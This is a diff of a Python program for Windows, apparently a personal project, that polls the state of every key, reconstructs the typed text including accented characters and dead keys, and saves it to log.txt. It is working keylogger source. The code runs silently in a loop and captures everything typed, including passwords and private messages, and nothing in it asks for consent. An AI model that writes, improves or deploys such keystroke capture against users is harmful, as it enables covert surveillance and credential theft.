@@ -3,9 +3,8 @@ Created on 07-03-2016
 
 @author: sceptross
 """
-
+import codecs
 import win32api
-import time
 import ctypes
 
 VK_CODE = {'backspace': 0x08,
@@ -15,7 +14,7 @@ VK_CODE = {'backspace': 0x08,
            'pause': 0x13,
            'caps_lock': 0x14,
            'esc': 0x1B,
-           'spacebar': 0x20,
+           'space_bar': 0x20,
            'page_up': 0x21,
            'page_down': 0x22,
            'end': 0x23,
@@ -67,16 +66,16 @@ VK_CODE = {'backspace': 0x08,
            'x': 0x58,
            'y': 0x59,
            'z': 0x5A,
-           'numpad_0': 0x60,
-           'numpad_1': 0x61,
-           'numpad_2': 0x62,
-           'numpad_3': 0x63,
-           'numpad_4': 0x64,
-           'numpad_5': 0x65,
-           'numpad_6': 0x66,
-           'numpad_7': 0x67,
-           'numpad_8': 0x68,
-           'numpad_9': 0x69,
+           'num_pad_0': 0x60,
+           'num_pad_1': 0x61,
+           'num_pad_2': 0x62,
+           'num_pad_3': 0x63,
+           'num_pad_4': 0x64,
+           'num_pad_5': 0x65,
+           'num_pad_6': 0x66,
+           'num_pad_7': 0x67,
+           'num_pad_8': 0x68,
+           'num_pad_9': 0x69,
            'multiply_key': 0x6A,
            'add_key': 0x6B,
            'separator_key': 0x6C,
@@ -134,8 +133,8 @@ VK_CODE = {'backspace': 0x08,
            'start_application_1': 0xB6,
            'start_application_2': 0xB7,
            'attn_key': 0xF6,
-           'crsel_key': 0xF7,
-           'exsel_key': 0xF8,
+           'cr_sel_key': 0xF7,
+           'ex_sel_key': 0xF8,
            'play_key': 0xFA,
            'zoom_key': 0xFB,
            'clear_key': 0xFE,
@@ -143,32 +142,109 @@ VK_CODE = {'backspace': 0x08,
            ',': 0xBC,
            '-': 0xBD,
            '.': 0xBE,
-           '~': 0xBF,
            '`': 0xC0,
            "'": 0xDB,
            '\\': 0xDC,
            '<': 0xE2,
            }
 
-printable_nonalphanumeric = ['+', ',', '-', '.', '~', "'", '\\', '<']
-shift_printable_nonalphanumeric = {
-                                   '+': '*',
-                                   ',': ';',
-                                   '-': '_',
-                                   '.': ':',
-                                   "'": '?',
-                                   '\\': '|',
-                                   '<': '>'
-                                   }
+VK_DEAD_KEY_CODE = {
+    '~': 0xBF,
+    u'\u00B4': 0xBA,
+}
+
+VK_NON_ASCII_CODE = {
+    u'\u00BA': 0xDE,
+    u'\u00AB': 0xDD,
+    u'\u00C7': 0xC0
+}
+
+printable_non_alphanumeric = ['+', ',', '-', '.', "'", '\\', '<']
+shift_printable_non_alphanumeric = {
+    '+': '*',
+    ',': ';',
+    '-': '_',
+    '.': ':',
+    "'": '?',
+    '\\': '|',
+    '<': '>'
+}
 shift_printable_numeric = ['=', '!', '"', '#', '$', '%', '&', '/', '(', ')']
+shift_dead_keys = {'~': '^', u'\u00B4': '`'}
 alt_gr_numeric = ['}', '', '@', '', '', '', '', '{', '[', ']']
 keysPressed = {}
 wasKeyPressedTheLastTimeWeChecked = {}
-log_file = open('log.txt', 'w')
 keysDown = []
+dead_key = ''
+all_keys = VK_CODE.copy()
+all_keys.update(VK_NON_ASCII_CODE)
+all_keys.update(VK_DEAD_KEY_CODE)
 locks_state = {'caps_lock': False,
                'num_lock': False,
                'scroll_lock': False}
+buf = ""
+ctrl = ['left_control', 'right_control']
+alt = ['left_menu', 'right_menu']
+
+
+def dead_key_handler(k, shift_state):
+    global buf
+    global dead_key
+    tilde = {
+        'a': (u'\u00E3', u'\u00C3'),
+        'o': (u'\u00F5', u'\u00D5'),
+        'n': (u'\u00F1', u'\u00D1')
+    }
+
+    circumflex = {
+        'a': (u'\u00E2', u'\u00C2'),
+        'e': (u'\u00EA', u'\u00CA'),
+        'i': (u'\u00EE', u'\u00CE'),
+        'o': (u'\u00F4', u'\u00D4'),
+        'u': (u'\u00FB', u'\u00DB')
+    }
+
+    acute = {
+        'a': (u'\u00E1', u'\u00C1'),
+        'e': (u'\u00E9', u'\u00C9'),
+        'i': (u'\u00ED', u'\u00CD'),
+        'o': (u'\u00F3', u'\u00D3'),
+        'u': (u'\u00FA', u'\u00DA')
+    }
+
+    grave = {
+        'a': (u'\u00E0', u'\u00C0'),
+        'e': (u'\u00E8', u'\u00C8'),
+        'i': (u'\u00EC', u'\u00CC'),
+        'o': (u'\u00F2', u'\u00D2'),
+        'u': (u'\u00F9', u'\u00D9')
+    }
+
+    diaeresis = {
+        'a': (u'\u00E4', u'\u00C4'),
+        'e': (u'\u00EB', u'\u00CB'),
+        'i': (u'\u00EF', u'\u00CF'),
+        'o': (u'\u00F6', u'\u00D6'),
+        'u': (u'\u00FC', u'\u00DC')
+    }
+
+    dead_keys = {
+        '~': tilde,
+        '^': circumflex,
+        u'\u00B4': acute,
+        '`': grave,
+        u'00A8': diaeresis
+    }
+
+    if dead_key in dead_keys:
+        if k in dead_keys[dead_key]:
+            buf += dead_keys[dead_key][k][shift_state % 2]
+        else:
+            buf += (dead_key + k)
+    else:
+        buf += (dead_key + k)
+
+    dead_key = ''
 
 
 def key_was_unpressed(k):
@@ -176,10 +252,20 @@ def key_was_unpressed(k):
 
 
 def key_was_pressed(k):
-    global string
+    global dead_key
     keysDown.append(k)
-    if is_alphanumeric(k):
-        log_file.write(k)
+    if k == '+' and get_alt_gr_pressed():
+        dead_key = u'00A8'
+        return
+
+    if k in VK_DEAD_KEY_CODE:
+        if ('left_shift' in keysDown) ^ ('right_shift' in keysDown):
+            dead_key = shift_dead_keys[k]
+        else:
+            dead_key = k
+        return
+
+    log_char(k)
 
 
 def is_key_pressed(k):
@@ -205,112 +291,129 @@ def is_numeric(k):
     return 0x30 <= ord(k) <= 0x39
 
 
-def is_numlock_key(k):
-    if len(k) != 1:
-        return False
-    return 0x60 <= ord(k) <= 0x6F
+def is_num_lock_key(k):
+    return 0x60 <= all_keys[k] <= 0x6F
 
 
 # Queries the Windows API to know which of the lock keys are turned on
 def set_locks_state():
-    hlldll = ctypes.WinDLL("User32.dll")
-    locks_state['caps_lock'] = bool(hlldll.GetKeyState(0x14))
-    locks_state['num_lock'] = bool(hlldll.GetKeyState(0x90))
-    locks_state['scroll_lock'] = bool(hlldll.GetKeyState(0x91))
+    hll_dll = ctypes.WinDLL("User32.dll")
+    locks_state['caps_lock'] = bool(hll_dll.GetKeyState(0x14))
+    locks_state['num_lock'] = bool(hll_dll.GetKeyState(0x90))
+    locks_state['scroll_lock'] = bool(hll_dll.GetKeyState(0x91))
 
 
-def log_char(k):
-    ctrl = ['left_control', 'right_control']
-    alt = ['left_alt', 'right_alt']
+def log_char(key_down):
+    global buf
 
-    # Check if alt gr / ctrl + alt is pressed
-    altgr = 'right_alt' in keysDown
-    if not altgr:
-        for k in ctrl:
-            if k in keysDown:
-                for l in alt:
-                    if l in keysDown:
-                        altgr = True
-    if altgr and is_numeric(k):
-        log_file.write(alt_gr_numeric[k])
+    alt_gr = get_alt_gr_pressed()
+    # If alt gr, a control or an alt key are pressed, nothing is typed, unless in the case of an alt gr + key
+    # combination, so it's useless to go on except in that case
+    if alt_gr:
+        if is_numeric(key_down):
+            buf += alt_gr_numeric[int(key_down)]
         return
 
-    # If ctrl / alt is pressed, nothing is typed, so it's useless to go on
-    for k in (ctrl + alt):
-        if k in keysDown:
-            return
+    if ctrl_key_pressed() or alt_key_pressed():
+        return
 
-    if k == 'spacebar':
-        log_file.write(' ')
+    if key_down == 'space_bar':
+        buf += ' '
         return
-    elif k == 'enter':
-        log_file.write('\n')
+    elif key_down == 'enter':
+        buf += '\n'
         return
-    elif k == 'del':
-        log_file.write('[del]')
-        return
-    elif k == 'backspace':
-        log_file.write('[backspace]')
+    elif key_down == 'backspace':
+        buf += '[backspace]'
         return
 
     # Check num lock keys
-    if locks_state['num_lock'] and is_numlock_key(k):
+    if locks_state['num_lock'] and is_num_lock_key(key_down):
         num_lock_keys = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '*', '+', '.', '-', ',', '/']
-        log_file.write(num_lock_keys[VK_CODE[k] - 0x60])
+        buf += num_lock_keys[all_keys[key_down] - 0x60]
         return
 
     # Count the number of shift keys pressed to know what was typed
     shift_state = 0
-    if 'shift_left' in keysDown:
+    if 'left_shift' in keysDown:
         shift_state += 1
-    if 'shift_right' in keysDown:
+    if 'right_shift' in keysDown:
         shift_state += 1
 
-    if is_alpha(k):
+    if is_alpha(key_down):
         if locks_state['caps_lock']:
             shift_state += 1
-        if shift_state % 2 == 1:
-            log_file.write(k.upper())
+        if dead_key != '':
+            dead_key_handler(key_down, shift_state)
+        elif shift_state % 2 == 1:
+            buf += key_down.upper()
         else:
-            log_file.write(k.lower())
-    elif is_numeric(k):
+            buf += key_down.lower()
+    elif is_numeric(key_down):
         if shift_state % 2 == 1:
-            log_file.write(shift_printable_numeric[int(k)])
+            buf += shift_printable_numeric[int(key_down)]
         else:
-            log_file.write(k)
-    elif k in printable_nonalphanumeric:
+            buf += key_down
+    elif key_down in printable_non_alphanumeric:
         if shift_state % 2 == 1:
-            log_file.write(shift_printable_nonalphanumeric[k])
+            buf += shift_printable_non_alphanumeric[key_down]
         else:
-            log_file.write(k)
+            buf += key_down
+    elif key_down in VK_NON_ASCII_CODE:
+        buf += key_down
+
+
+def get_alt_gr_pressed():
+    # Check if alt gr / ctrl + alt combo is pressed
+    alt_gr = 'right_menu' in keysDown
+    if not alt_gr:
+        for k in ctrl:
+            if k in keysDown:
+                for l in alt:
+                    if l in keysDown:
+                        alt_gr = True
+    return alt_gr
+
+
+def ctrl_key_pressed():
+    return (ctrl[0] in keysDown) or (ctrl[1] in keysDown)
+
+
+def alt_key_pressed():
+    return (alt[0] in keysDown) or (alt[1] in keysDown)
 
 
 def init():
     set_locks_state()
-    for key in VK_CODE:
+    for key in all_keys:
         keysPressed[key] = False
         wasKeyPressedTheLastTimeWeChecked[key] = False
+
+
+def write_to_log():
+    with codecs.open("log.txt", "w", 'UTF-8') as f:
+        f.write(buf)
 
 
 def main():
     init()
     while True:
-        try:
-            for k in VK_CODE:
-                key_is_pressed = is_key_pressed(VK_CODE[k])
-                if key_is_pressed and not wasKeyPressedTheLastTimeWeChecked:
-                    key_was_pressed(k)
-                    keysPressed[k] = True
-                    if k == 'caps_lock' or k == 'num_lock' or k == 'scroll_lock':
-                        locks_state[k] = not locks_state[k]
-                if not key_is_pressed and wasKeyPressedTheLastTimeWeChecked[k]:
-                    key_was_unpressed(k)
-                    keysPressed[k] = False
-                    wasKeyPressedTheLastTimeWeChecked[k] = key_is_pressed
-            time.sleep(0.01)
-        except KeyboardInterrupt:
-            log_file.close()
-            print string
-            quit()
+        if ctrl_key_pressed() and 'c' in keysDown:
+            break
+        for k in all_keys:
+            key_is_pressed = is_key_pressed(all_keys[k])
+            if key_is_pressed and not wasKeyPressedTheLastTimeWeChecked[k]:
+                key_was_pressed(k)
+                keysPressed[k] = True
+                wasKeyPressedTheLastTimeWeChecked[k] = True
+                if k == 'caps_lock' or k == 'num_lock' or k == 'scroll_lock':
+                    locks_state[k] = not locks_state[k]
+            if not key_is_pressed and wasKeyPressedTheLastTimeWeChecked[k]:
+                key_was_unpressed(k)
+                keysPressed[k] = False
+                wasKeyPressedTheLastTimeWeChecked[k] = False
+    write_to_log()
+    quit()
+
 
 main()
